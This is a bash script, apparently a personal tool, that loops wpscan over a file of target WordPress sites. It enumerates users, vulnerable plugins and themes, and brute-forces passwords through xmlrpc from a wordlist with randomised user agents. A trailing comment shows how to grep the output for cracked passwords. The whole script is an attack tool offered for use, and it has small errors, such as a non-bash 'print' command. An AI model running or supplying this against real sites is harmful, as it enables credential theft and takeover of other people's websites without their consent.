#!/bin/bash
command clear

printf '\n########################################################################\n'
printf '##                 WordPress Auto Brute Force Users                   ##\n'
printf '##                     Leighton-0    (Jan 2023)                       ##\n'
printf '########################################################################\n\n'

sleep 5

wpscan --update
read -p $'\e[1;92m File path for targets: \e[0m' wl_pass
# -p prompt asks for a file name for the list of sites - names this site wl_pass

wl_pass="${wl_pass}"
# creates a variable called wp_pass

count_pass=$(wc -l $wl_pass | cut -d " " -f1)
# counts the number of lines in wp_pass file

for fn in `cat $wl_pass`; do
wpscan --url $fn -e  u vp vt --passwords zz_passwords --random-user-agent --password-attack xmlrpc --ignore-main-redirect --force >> result1
# Note: wp-login can be interchanged with xmlrpc or xmlrpcmulitcall

done

print "Finished - check the results"

#   README
#   Usefull for parsing results
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2

#   TO DO
#   Improve Parsing
